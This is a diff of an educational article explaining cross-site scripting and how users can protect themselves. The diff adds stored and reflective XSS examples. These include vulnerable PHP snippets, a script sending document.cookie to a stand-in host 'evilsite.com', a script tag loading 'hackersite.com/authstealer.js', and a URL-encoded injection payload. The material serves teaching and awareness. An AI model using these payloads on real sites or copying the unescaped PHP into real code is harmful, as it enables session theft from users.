@@ -5,7 +5,7 @@ Introduction
 ------------
 
 
-Cross-site scripting is when an attacker inserts code into a legitimate website, 
+Cross-site scripting is when an attacker inserts code into a legitimate website 
 and is considered one of the more dangerous website vulnerabilities. Web sites are 
 vulnerable  when they don't use validation or encoding on user generated 
 data. This is dangerous for the site users, who are at risk for their data being 
@@ -16,13 +16,13 @@ as using anti-viruses, checking that the sites they are using are safe, and bein
 careful of clicking on unknown links.  
 
 
-What is Cross-site scripting and Why is it Dangerous?
+What is Cross-Site Scripting and Why is it Dangerous?
 -----------------------------------------------------
 
 
 XSS, or Cross-Site Scripting is inserting malicious code into an actual website 
 to gather information from the users. Most of the danger lies on the users of the 
-sites, as the code targets their information and use rather than the website itself. [xss]_ 
+sites, as the code targets their information and use rather than the website itself. [XSS]_ 
 
 
 * Some examples of what dangerous XSS could do include: 
@@ -43,11 +43,11 @@ included in the account, such as an Amazon Prime or credit card account.
 	
 * There are two different types of XSS attacks, stored and reflective
 
-	* Stored xss is "stored", or imbedded, on the website itself and steals data every time 
+	* Stored XSS is "stored", or imbedded, on the website itself and steals data every time 
 	  the website is visited. [xss-prevention]_ It is also known as "persistent XSS", 
 	  and can be the more dangerous of the two types. [xss-attacks]_
 
-	* Reflective xss is stored in a link embedded in the website that the user has to 
+	* Reflective XSS is stored in a link embedded in the website that the user has to 
 	  click on to activate. [xss-attacks]_ 
  
   
@@ -109,28 +109,27 @@ What You Can Do To Spot/Prevent XSS
   attacks are usually heard coming through emails, and happen when the user clicks on a 
   link that leads them to a malicious website. 
   
-  * For example, if you get an email saying that your password/username has expired 
-    or needs to be changed, the safest option is to go to a new tab and go to the 
-	website yourself to see if the password/username really needs changed, and if 
-	it does, you can change it through the website itself. 
-	
-  * The same process should be used if you get an email saying that your shipping 
-    or billing information needs to be updated for an online order. 
+	* For example, if you get an email saying that your password/username has expired 
+	  or needs to be changed, the safest option is to go to a new tab and go to the 
+	  website yourself to see if the password/username really needs changed, and if 
+	  it does, you can change it through the website itself. 
+	  
+	* The same process should be used if you get an email saying that your shipping 
+	  or billing information needs to be updated for an online order. 
 
 * Make sure that websites that you are visiting are safe, or take precautions before 
   or while you are on the website. 
   
-  * Some anti-viruses, such as Norton and Kaspersky, come with web add-ons that will 
-    check out websites when you google them. For Kaspersky, this can show up as a 
-	green tag with a K inside next to websites that it has verified are safe to 
-	visit, a grey version next to links that it cannot verify, and a red version for 
-	links that are deemed dangerous. 
-	
+	* Some anti-viruses, such as Norton and Kaspersky, come with web add-ons that will 
+	  check out websites when you google them. For Kaspersky, this can show up as a 
+	  green tag with a K inside next to websites that it has verified are safe to 
+	  visit, a grey version next to links that it cannot verify, and a red version for 
+	  links that are deemed dangerous. 
 
 * Have a good Anti-Virus/ Web Security, such as McAfee AntiVirus Plus, Bitdefender 
   AnitVirus Plus, or Kaspersky Anti-Virus. As shown above, these can protect you from 
   malicious links while googling, but they can also protect the user from phishing 
-  and keylogging attempts. 
+  and keylogging attempts.  
 
 Example of Cross-Site Scripting:
 -------------------------------
@@ -145,16 +144,49 @@ Example of Cross-Site Scripting:
   
   "Great price for a great item! Read my review here <script src="http://hackersite.com/authstealer.js"> </script>" [xss-attacks]_
   
-  This is a stored in the website, and every time someone visits the page, they can 
+  This is stored in the website, and every time someone visits the page, they can 
   have their session cookies stolen. 
 
 
 	* However, this is harder for hackers to attempt, because they must find a 
 	  highly trafficked site that also has a security hole that they can infiltrate. [xss-prevention]_
+
+* Another Stored XSS example would be: 
+
+	* Vulnerability: ``<div id="profile"><?php echo $user['profile']; ?></div>``
+	  This only works if the profile is pulled from a database with no escapeing 
+	  (discussed above) to protect it. The following script will show how this 
+	  vulnerability could be used to steal the user's cookies. This would allow 
+	  the hacker to impersonate the user who looked at the website. [xss-attacks]_ 
+	 
+	* Attack: 
 	
+	  ``<script>``
+	  
+		``window.open("http://evilsite.com/cookie_stealer.php?cookie=" + document.cookie, "_blank");``
+		
+	  ``</script>``
+
 	
-* Reflective XSS: Similar to above, except that the user would have to click on the link 
+* Reflective XSS: Similar to the first stored example above, except that the user would have to click on the link 
   to activate the code. 
+  
+* Another reflectve XSS example would be: 
+
+	* Vulnerability: ``<form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="post">`` 
+	  All the attacker needs to do in this case is get the user to click on the link 
+	  shown below, and an alert saying "XSS"(code) will pop up.  [xss-attacks]_  	  
+	
+	* Attack:
+	
+	  Link: ``/form.php?%22%20onload%3D%22alert(%27XSS%27)%3B``
+	  
+	  Code: ``<form action="/form.php?" onload="alert('XSS');" method="post">`` 
+	  
+In real life, this would almost certainly do more harm than a simple pop-up. Some 
+examples would be popping up a new form for you to fill out, that would sent the 
+data to the hackers, or showing an error with a message saying you need to download 
+their specific "software" (most likely malware) to get rid of the error.
 
 
 Sources
